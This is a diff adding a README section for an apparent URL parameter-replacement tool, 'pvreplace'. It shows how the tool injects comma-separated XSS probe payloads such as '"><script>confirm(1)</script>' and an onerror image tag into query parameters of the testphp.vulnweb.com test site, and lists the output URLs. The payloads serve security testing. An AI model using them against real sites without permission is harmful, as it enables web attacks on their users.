@@ -53,6 +53,21 @@ https://example.com/path?one=<script>alert(1)</script>&two=<script>alert(1)</scr
 https://example.com/path?two=<script>alert(1)</script>&one=<script>alert(1)</script>
 ```
 
+### Replace multiple payloads separated by commas
+```
+# urls.txt file content
+http://testphp.vulnweb.com/listproducts.php?artist=dfgsdftgerer
+http://testphp.vulnweb.com/listproducts.php?artist=dfgsdftgerer&asdf=yry4tytr&cat=fgfgh
+
+
+# Command
+cat urls.txt | pvreplace '"><script>confirm(1)</script>, "<image/src/onerror=confirm(1)>' -without-encode
+http://testphp.vulnweb.com/listproducts.php?artist="><script>confirm(1)</script>
+http://testphp.vulnweb.com/listproducts.php?artist="<image/src/onerror=confirm(1)>
+http://testphp.vulnweb.com/listproducts.php?artist="><script>confirm(1)</script>&asdf="><script>confirm(1)</script>&cat="><script>confirm(1)</script>
+http://testphp.vulnweb.com/listproducts.php?artist="<image/src/onerror=confirm(1)>&asdf="<image/src/onerror=confirm(1)>&cat="<image/src/onerror=confirm(1)>
+```
+
 ### Comparsion
 ```
 ## qsreplace
